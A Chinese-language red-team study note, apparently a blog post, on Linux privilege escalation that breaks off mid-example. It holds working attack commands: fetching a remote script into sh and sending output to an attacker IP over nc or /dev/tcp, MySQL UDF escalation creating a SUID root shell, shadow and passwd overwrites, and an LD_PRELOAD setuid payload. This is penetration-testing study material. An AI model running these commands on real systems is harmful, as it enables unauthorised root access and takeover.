      <category>experiment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>「红队笔记」Linux提权精讲</title>
    <link href="/2023/07/fc6d5535056b.html"/>
    <url>/2023/07/fc6d5535056b.html</url>
    
    <content type="html"><![CDATA[<h1 id="「红队笔记」Linux-提权精讲"><a href="#「红队笔记」Linux-提权精讲" class="headerlink" title="「红队笔记」Linux 提权精讲"></a>「红队笔记」Linux 提权精讲</h1><p>Privilege Escation 可缩写为 PrivEsca 或 PE。提权操作存在的原因：应用程序通常是按需配置权限的</p><h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><h3 id="重要的权限体系"><a href="#重要的权限体系" class="headerlink" title="重要的权限体系"></a>重要的权限体系</h3><ul><li>UGO 基本权限：Linux 操作系统中最常见的权限管理方式，UGO 分别代指文件所有者、组和其他人<ul><li>补充知识点 1：目录的权限。对于目录来说，目录中存储的是该目录下文件&#x2F;目录名称的列表，因此如果一个用户拥有对某个目录的 r 权限，这意味着可以通过 ls 命令列出文件，而如果拥有的是 x 权限，这意味着用户可以进入该目标并成为当前的工作目录，如果没有对某个目录的 x 权限，那么就无法查看该目录下文件的具体内容</li><li>补充知识点 2：修改文件权限的相关信息。chown 用于改变文件所有者，chgrp 用于改变文件所属的组，chmod 用于改变文件的权限</li><li>补充知识点 3：不同文件类型的表示。d 表示目录；- 表示普通文件；l 表示链接文件；b 表示块设备文件；c 表示字符设备文件；s 表示 socket 文件</li><li>补充知识点 4：权限分配的两种方式<ul><li>Symbolic method：<code>chmod WhoWhatWhich file | directory</code><ul><li>Who - represents identities: u,g,o,a (user, group, other, all)</li><li>What - represents actions: +, -, &#x3D; (add, remove, set exact)</li><li>Which - represents access levels: r, w, x (read, write, execute) and s</li></ul></li><li>Numeric method：<code>chmod ### file | directory</code></li></ul></li></ul></li><li>SUID, SGID, sticky: s means special.<ul><li>SUID: A file with SUID always executes as the user who owns the file. If the file owner doesn’t have execute permissions, then use an uppercase S here.</li><li>SGID: If set on a file, it allows the file to be executed as the group that owns the file (similar to SUID). If <strong>set on a directory</strong>, any files created in the directory will have their group ownership set to that of the <strong>directory owner</strong>.</li><li>other + t (sticky): This permission does not affect individual files. <strong>Only the owner (and root)</strong> of a file <strong>can remove</strong> the file within that directory.. A common example of this is the <code>/tmp</code> directory</li><li>Setting special permissions: SUID &#x3D; 4; SGID &#x3D; 2; Sticky &#x3D; 1; <code>chmod X### file | directory</code></li><li>note: The permission set is noted by the lowercase t or x, where the x would normally indicate the execute privilege.</li></ul></li></ul><blockquote><p>参考文章：<br><a href="https://www.cnblogs.com/sparkdev/p/9573355.html">Linux ugo 权限 - sparkdev - 博客园 (cnblogs.com)</a><br><a href="https://www.redhat.com/sysadmin/suid-sgid-sticky-bit">Linux permissions: SUID, SGID, and sticky bit | Enable Sysadmin (redhat.com)</a></p></blockquote><ul><li>Capabilities: <ul><li>背景：Linux 区分两类进程，特权进程(其有效用户标识为 0，也就是超级用户 root)和非特权进程(其有效用户标识为非零)。特权进程绕过所有内核权限检查，而非特权进程则根据进程凭证(通常为有效 UID，有效 GID 和补充组列表)进行完全权限检查。</li><li>capabilities 机制出现的原因：SUID 虽然可以解决普通用户无需密码以 root 权限运行某些命令的问题，却带来了安全隐患。当运行设置了 SUID 的命令时，通常只是需要很小一部分的特权，但是 SUID 给了它 root 具有的全部权限。因此一旦 被设置了 SUID 的命令出现漏洞，就很容易被利用。也就是说 SUID 机制在增大了系统的安全攻击面。</li><li>机制：将与 root 关联的特权划分为精细粒度的特权集，并将其按需分配给线程或者文件。对于进程来说，capabilities 是细分到线程的，即每个线程可以有自己的 capabilities。对于文件来说，capabilities 保存在文件的扩展属性中。<ul><li>线程的 capabilities：每一个线程，具有 5 个 capabilities 集合，每一个集合使用 <code>64</code> 位掩码来表示，显示为 <code>16</code> 进制格式。<ul><li>Permitted：并不使能线程的 capabilities。从 <code>Effective</code> 或 <code>Inheritable</code> 集合中添加或删除 capability 的前提是，添加或删除的 capability 必须包含在 Permitted 集合中</li><li>Effective：内核检查线程是否可以进行特权操作时，检查的对象便是 <code>Effective</code> 集合。</li><li>Inheritable：当执行 <code>exec()</code> 系统调用时，能够被新的可执行文件继承的 capabilities，被包含在 <code>Inheritable</code> 集合中。但包含在该集合中的 capabilities 并不会自动继承给新的可执行文件，即不会添加到新线程的 <code>Effective</code> 集合中，它只会影响新线程的 <code>Permitted</code> 集合。</li><li>Bounding：<code>Bounding</code> 集合是 <code>Inheritable</code> 集合的超集，如果某个 capability 不在 <code>Bounding</code> 集合中，即使它在 <code>Permitted</code> 集合中，该线程也不能将该 capability 添加到它的 <code>Inheritable</code> 集合中。Bounding 集合的 capabilities 在执行 <code>fork()</code> 系统调用时会传递给子进程的 Bounding 集合，并且在执行 <code>execve</code> 系统调用后保持不变。</li><li>Ambient：非特权用户如果在 <code>Permitted</code> 集合中有一个 capability，那么可以添加到 <code>Ambient</code> 集合中，这样它的子进程便可以在 <code>Ambient</code>、<code>Permitted</code> 和 <code>Effective</code> 集合中获取这个 capability。</li></ul></li><li>文件的 capabilities<ul><li>Permitted：在文件被执行时，会与线程的 Bounding 集合计算交集，然后添加到线程的 Permitted 集合中。</li><li>Inheritable：这个集合与线程的 Inheritable 集合的交集，会被添加到执行完 execve() 后的线程的 Permitted 集合中。</li><li>Effective：仅仅是一个标志位。如果设置开启，那么在执行完 execve() 后，线程 Permitted 集合中的 capabilities 会自动添加到它的 Effective 集合中。</li></ul></li></ul></li></ul></li></ul><blockquote><p>这部分看着有点头疼，下次遇到了再捋捋，先做个简单的记录，推荐第一篇文章<br><a href="https://icloudnative.io/posts/linux-capabilities-why-they-exist-and-how-they-work/">Linux Capabilities 入门教程：概念篇 – 云原生实验室 - Kubernetes|Docker|Istio|Envoy|Hugo|Golang|云原生 (icloudnative.io)</a><br><a href="https://www.cnblogs.com/sparkdev/p/11417781.html">Linux Capabilities 简介 - sparkdev - 博客园 (cnblogs.com)</a><br>另外关于渗透中如何查看 capabilities 使用的命令如下<br><code>/sbin/getcap -r / 2&gt;/dev/null</code></p></blockquote><ul><li>AppArmor 和 SELinux：这两种安全模块通过强制访问控制（MAC）策略增强了系统的安全性。它们可以限制进程和文件的访问权限，从而降低潜在的安全风险。<ul><li>AppArmor 通过定义所谓的“配置文件”，为每个应用程序设定允许和禁止的操作，从而限制进程对系统资源的访问。</li><li>SELinux 通过为文件、进程等系统资源分配安全上下文（安全标签），并根据预先定义的安全策略规则来控制访问</li></ul></li><li>Access Control Lists (ACLs):ACLs 提供了比传统文件权限更灵活的权限管理方式，允许为特定用户和组分配文件或目录的特定权限。</li><li>其他二十多个权限体系和安全机制</li></ul><h2 id="提权原理归纳"><a href="#提权原理归纳" class="headerlink" title="提权原理归纳"></a>提权原理归纳</h2><p>原理1：低权限可修改的可执行文件或脚本，能以高权限身份运行。这是从权限体系总结出来的，是一大类情形的原理。</p><p>原理2：从用户行为角度，用低权限用户的运维人员，也需要记忆、输入、备份凭据，以备使用高权限用户完成操作。</p><p>原理3：在权限的上层，捕捉、拦截、修改凭据信息或权限信息，如一些基于内存读取操作实现的内核利用。</p><h2 id="Linux-提权枚举"><a href="#Linux-提权枚举" class="headerlink" title="Linux 提权枚举"></a>Linux 提权枚举</h2><p>这里只简单记录，对于自己比较熟练的不过赘述</p><h3 id="终端升级与提高稳定性"><a href="#终端升级与提高稳定性" class="headerlink" title="终端升级与提高稳定性"></a>终端升级与提高稳定性</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br>CTRL + Z<br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span><br><span class="hljs-built_in">fg</span><br><span class="hljs-built_in">export</span> TERM=xterm-color<br><br><span class="hljs-comment"># 或者</span><br>rlwrap nc -lvnp &lt;port&gt;<br></code></pre></td></tr></table></figure><h3 id="ps-ef"><a href="#ps-ef" class="headerlink" title="ps -ef"></a>ps -ef</h3><p><code>ps -A</code> 或 <code>-e</code>：查看所有运行进程</p><p><code>ps axjf</code>：查看进程树</p><p><code>ps aux</code>：显示所有用户的进程（a），显示启动进程的用户（u），并显示未连接到终端的进程（x）。</p><p><code>top -n 1</code> : top 命令可以帮助用户监控系统性能，查看当前运行的进程及其资源使用情况，如 CPU 使用率、内存使用情况等。-n 是一个选项，用于指定 top 命令应显示的迭代次数。</p><h3 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h3><p><code>netstat -a</code>：显示所有正在监听的端口和已建立的连接。</p><p><code>netstat -at</code> 或 <code>netstat -au</code> 也可用于分别列出 TCP 或 UDP 协议。</p><p><code>netstat -tp</code>：列出服务名称和 PID 信息的连接。</p><p><code>netstat -ano</code>：<code>-a</code>，显示所有套接字；<code>-n</code>，不解析名称；<code>-o</code>：显示计时器</p><h3 id="x2F-etc-x2F-fstab"><a href="#x2F-etc-x2F-fstab" class="headerlink" title="&#x2F;etc&#x2F;fstab"></a>&#x2F;etc&#x2F;fstab</h3><p>检测未挂载的文件系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/fstab<br></code></pre></td></tr></table></figure><h3 id="提权辅助工具"><a href="#提权辅助工具" class="headerlink" title="提权辅助工具"></a>提权辅助工具</h3><ol><li>LinPEAS，全称为 Linux Privilege Escalation Awesome Script，是一个用来搜索类 unix 主机上可能的提权路径的自动化脚本。Github： <a href="https://github.com/carlospolop/privilegeescalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilegeescalation-awesome-scripts-suite/tree/master/linPEAS</a></li><li>LinEnum：一个流行的 Linux 本地枚举脚本，用于收集有关系统的各种信息，识别不安全的配置，提取可用于提升权限的漏洞信息。 GitHub： <a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></li><li>linux-smart-enumeration (lse)：这是一个具有模块化功能的 Linux 本地枚举脚本，它可在不同的等级上运行以获取不同详细程度的信息。 GitHub： <a href="https://github.com/diegocat-treitos/linux-smart-enumeration">https://github.com/diegocat-treitos/linux-smart-enumeration</a></li><li>linux-exploit-suggester：该工具主要用于识别 Linux 系统中可能存在的可利用的漏洞，以帮助用户提升权限。 GitHub： <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li><li>Linuxprivchecker：一个用于检查 Linux 系统潜在安全问题的 Python 脚本，包括文件权限、系统服务和 SUID 二进制文件等。 GitHub： <a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></li><li>unix-privesc-check：这个脚本主要用于识别类 UNIX 系统中可能的权限升级路径，通过检查文件权限、系统配置等方面的问题。 GitHub： <a href="https://github.com/pentestmonkey/unix-privesc-check">https://github.com/pentestmonkey/unix-privesc-check</a></li></ol><p>目标系统的环境将影响您将要使用的工具，例如，如果目标系统上没有安装 Python，那么用 Python 编写的工具将无法运行；如果系统针对某些函数、关键字做了屏蔽，就要换一个试试，这就是为什么最好熟悉几个工具，而不是只有一个专用工具。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 从GitHub直接执行</span><br>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh<br><br><span class="hljs-comment"># 从内存中执行，结果发回kali</span><br>nc -lvnp 81 | <span class="hljs-built_in">tee</span> linpeas.out <span class="hljs-comment">#kali</span><br>curl 10.10.10.10/linpeas.sh | sh | nc 10.10.10.10 81 <span class="hljs-comment">#靶机</span><br><br><span class="hljs-comment"># 没有curl的情况，-q 指定 “nc” 命令中的超时时间。</span><br>sudo nc -q 5 -lvnp 80 &lt; linpeas.sh <span class="hljs-comment">#kali</span><br><span class="hljs-built_in">cat</span> &lt; /dev/tcp/10.10.10.10/80 | sh <span class="hljs-comment">#靶机</span><br><br><span class="hljs-comment"># 输出到文件</span><br>./linpeas.sh -a &gt; /dev/shm/linpeas.txt <span class="hljs-comment">#主机</span><br>less -r /dev/shm/linpeas.txt <span class="hljs-comment">#读取分色文件</span><br></code></pre></td></tr></table></figure><h2 id="提权实例"><a href="#提权实例" class="headerlink" title="提权实例"></a>提权实例</h2><h3 id="服务漏洞利用提权"><a href="#服务漏洞利用提权" class="headerlink" title="服务漏洞利用提权"></a>服务漏洞利用提权</h3><h4 id="MySQL-UDF-提权"><a href="#MySQL-UDF-提权" class="headerlink" title="MySQL-UDF 提权"></a>MySQL-UDF 提权</h4><p>UDF: User Defined Function</p><p>提权条件</p><ul><li>掌握 MySQL 数据库的账户，该账户对 MySQL 拥有 create、insert、delete 等权限，以创建和使用函数（最好直接是 root 账户）</li><li>securefile_priv 为空字符串（’’）：<code>show variables like &#39;%secure_file_priv%&#39;;</code> 这是能否利用 udf 提权的重要条件。它可以限制这些操作仅在特定目录下进行，以增强服务器的安全性。如果设置为 NULL 则禁用这些操作</li></ul><blockquote><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件<br>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><p>两种提权手法</p><h5 id="手动上传动态链接库"><a href="#手动上传动态链接库" class="headerlink" title="手动上传动态链接库"></a>手动上传动态链接库</h5><p>查询是否 secure_file_priv 没有限制</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs SQL">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-------+</span><br><span class="hljs-operator">|</span> Variable_name    <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-------+</span><br><span class="hljs-operator">|</span> secure_file_priv <span class="hljs-operator">|</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><h6 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h6><p>如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p><p>Metasploit 里面都自带了对应系统的动态链接库文件。其位于 <code>/usr/…/metasploit-framework/data/exploits/mysql</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/usr/…/metasploit-framework/data/exploits/mysql]<br>└─$ <span class="hljs-built_in">ls</span> -liah<br>total 56K<br>395515 drwxr-xr-x   2 root root 4.0K Jun 20 05:31 .<br>394285 drwxr-xr-x 202 root root  20K Jun 20 05:31 ..<br>402381 -rwxr-xr-x   1 root root 6.5K Jun  1 12:22 lib_mysqludf_sys_32.dll<br>402382 -rw-r--r--   1 root root 5.6K Jun  1 12:22 lib_mysqludf_sys_32.so<br>402383 -rwxr-xr-x   1 root root 7.0K Jun  1 12:22 lib_mysqludf_sys_64.dll<br>402384 -rw-r--r--   1 root root 7.9K Jun  1 12:22 lib_mysqludf_sys_64.so<br></code></pre></td></tr></table></figure><h6 id="插件目录位置"><a href="#插件目录位置" class="headerlink" title="插件目录位置"></a>插件目录位置</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs SQL">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+------------------------------+</span><br><span class="hljs-operator">|</span> Variable_name <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>                        <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+------------------------------+</span><br><span class="hljs-operator">|</span> plugin_dir    <span class="hljs-operator">|</span> <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span><span class="hljs-keyword">local</span><span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>plugin<span class="hljs-operator">/</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">---------------+------------------------------+</span><br></code></pre></td></tr></table></figure><p>如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 \lib\plugin 文件夹。关于如何确定 MySQL 的安装目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> @@basedir;<br>+------------------+<br>| @@basedir        |<br>+------------------+<br>| /usr/local/mysql |<br>+------------------+<br></code></pre></td></tr></table></figure><h6 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h6><p>可以通过 SQLMap 来写入，前提：SQL 注入且是高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入，这个时候就可以直接使用 sqlmap 来上传动态链接库，又因为 GET 有字节长度限制，所以往往 POST 注入才可以执行这种攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://localhost:30008/&quot;</span> --data=<span class="hljs-string">&quot;id=1&quot;</span> --file-write=<span class="hljs-string">&quot;/Users/sec/Desktop/lib_mysqludf_sys_64.so&quot;</span> --file-dest=<span class="hljs-string">&quot;/usr/lib/mysql/plugin/udf.so&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ERROR 1126 (HY000): Can<span class="hljs-string">&#x27;t open shared library &#x27;</span>udf.dll<span class="hljs-string">&#x27; (errno: 193 )</span><br><span class="hljs-string"># 这个报错，因为 lib_mysqludf_sys_64.dll 失败，最后使用 lib_mysqludf_sys_32.dll 才成功，所以这里的 dll 应该和系统位数无关，可能和 MySQL 的安装版本有关系，而 PHPStudy 自带的 MySQL 版本是 32 位的</span><br></code></pre></td></tr></table></figure><h6 id="创建自定义函数并调用命令"><a href="#创建自定义函数并调用命令" class="headerlink" title="创建自定义函数并调用命令"></a>创建自定义函数并调用命令</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL">mysql <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> STRING SONAME <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure><p>导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> mysql.func;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------+-----+---------+----------+</span><br><span class="hljs-operator">|</span> name     <span class="hljs-operator">|</span> ret <span class="hljs-operator">|</span> dl      <span class="hljs-operator">|</span> type     <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+-----+---------+----------+</span><br><span class="hljs-operator">|</span> sys_eval <span class="hljs-operator">|</span>   <span class="hljs-number">0</span> <span class="hljs-operator">|</span> udf.dll <span class="hljs-operator">|</span> <span class="hljs-keyword">function</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+-----+---------+----------+</span><br></code></pre></td></tr></table></figure><p>这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql &gt; <span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><h5 id="编译动态链接库"><a href="#编译动态链接库" class="headerlink" title="编译动态链接库"></a>编译动态链接库</h5><p>使用的脚本：<a href="https://www.exploit-db.com/exploits/1518">MySQL 4.x&#x2F;5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) - Linux local Exploit (exploit-db.com)</a></p><h6 id="准备利用文件"><a href="#准备利用文件" class="headerlink" title="准备利用文件"></a>准备利用文件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -c raptor_udf2.c -fPIC<br></code></pre></td></tr></table></figure><ul><li><code>fPIC</code> ：这个选项告诉编译器生成位置无关代码（Position-Independent Code，PIC）。这种代码可以在内存中的任何位置执行，这对于创建共享库（如动态链接库）非常有用，因为它们可以被多个程序在运行时共享</li><li><code>-c</code> ：这个选项指示编译器仅编译源代码，但不进行链接。编译器将生成一个目标文件（object file），通常具有.o 扩展名。这对于将多个源文件分别编译成目标文件，然后链接为一个可执行程序或库很有用。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc<br></code></pre></td></tr></table></figure><ol><li><code>-shared</code> : 这个选项指示编译器生成一个共享库（shared library）文件，而不是一个可执行文件。共享库允许多个程序共享相同的库代码，从而减少了程序的大小和内存占用。</li><li><code>-Wl</code> : 该选项告诉编译器将后面的选项传递给链接器。在这里，它用于传递 <code>- soname,raptor_udf2.so</code> 选项。(Warning and Link)</li><li><code>-soname,raptor_udf2.so</code> : 这个选项设置了生成的共享库的“soname”（共享对象名称）。soname 是一个简短的标识符，用于在运行时链接器（如 ld.so 或 ld-linux.so）解析共享库依赖关系时引用该共享库。通常，soname 包括主版本号，以便在升级库时保持二进制兼容性。</li><li><code>-lc</code> : 这个选项告诉链接器链接 C 标准库（libc）。这通常是编译 C 程序所必需的，因为它提供了基本的系统函数，如 malloc、free 等。</li></ol><p>利用过程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs SQL">use mysql;<br><br># &quot;foo&quot; 在计算机编程和网络领域中是一个常用的占位符名称<br># <span class="hljs-type">BLOB</span> 表示 &quot;Binary Large Object&quot;，它可以存储大量的二进制数据<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> foo(line <span class="hljs-type">blob</span>);<br><br># 装载动态链接库<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> foo <span class="hljs-keyword">values</span>(load_file(<span class="hljs-string">&#x27;/home/user/tools/mysqludf/</span><br><span class="hljs-string">raptor_udf2.so&#x27;</span>));<br><br># 写入到插件目录中<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> foo <span class="hljs-keyword">into</span> dumpfile <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;<br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 找plugin目录中的.so文件<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> do_system <span class="hljs-keyword">returns</span> <span class="hljs-type">integer</span> soname <span class="hljs-string">&#x27;raptor_udf2.so&#x27;</span>;<br><br># 查询已有udf<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> mysql.func;<br><br># 提权<br><span class="hljs-keyword">select</span> do_system(<span class="hljs-string">&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;</span>);<br></code></pre></td></tr></table></figure><p>如果 dumpfile 失败，对于 AppArmor（如果您使用的是基于 Debian 的系统，如 Ubuntu），编辑 <code>/etc/apparmor.d/usr.sbin.mysqld</code> 文件，找到以下行：<code>/usr/sbin/mysqld &#123;</code>，在此行下方添加以下内容：<code>/usr/lib/mysql/plugin/**rw,</code></p><h3 id="可读-shadow-文件利用提权"><a href="#可读-shadow-文件利用提权" class="headerlink" title="可读 shadow 文件利用提权"></a>可读 shadow 文件利用提权</h3><p>转存哈希信息后，使用 john 进行爆破</p><h3 id="可写-shadow-文件利用提权"><a href="#可写-shadow-文件利用提权" class="headerlink" title="可写 shadow 文件利用提权"></a>可写 shadow 文件利用提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 操作前备份，防止有回退的需求</span><br><span class="hljs-built_in">cp</span> /etc/shadow /tmp/shadow.bak<br><br><span class="hljs-comment"># 指定密码哈希类型和新密码，得到字符串后将其替换root的密码哈希即可</span><br>mkpasswd -m sha-512 passwd123<br></code></pre></td></tr></table></figure><h3 id="可写-passwd-提权"><a href="#可写-passwd-提权" class="headerlink" title="可写 passwd 提权"></a>可写 passwd 提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 提前备份</span><br><span class="hljs-built_in">cp</span> /etc/passwd /tmp/passwd.bak<br><br><span class="hljs-comment"># 生成密码哈希，得到字符串后将其替换root的密码哈希或者x即可</span><br>openssl passwd passwd123<br></code></pre></td></tr></table></figure><h3 id="sudo-环境变量提权"><a href="#sudo-环境变量提权" class="headerlink" title="sudo 环境变量提权"></a>sudo 环境变量提权</h3><p>LD_PRELOAD 是允许任何程序使用共享库的功能。如果启用了“env_keep”选项，我们可以生成一个共享库，该共享库将在运行程序之前加载和执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检查 LD_PRELOAD（带有 env_keep 选项）</span><br>user@debian:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> user on this host:<br>env_reset, env_keep+=LD_PRELOAD<br>User user may run the following commands on this host:<br>(root) NOPASSWD: /usr/sbin/iftop<br>(root) NOPASSWD: /usr/bin/find<br><br><span class="hljs-comment"># 编写一个简单的 C 代码作为共享对象（.so 扩展名）文件编译</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br>void <span class="hljs-function"><span class="hljs-title">_init</span></span>() &#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>setgid(0);<br>setuid(0);<br>system(<span 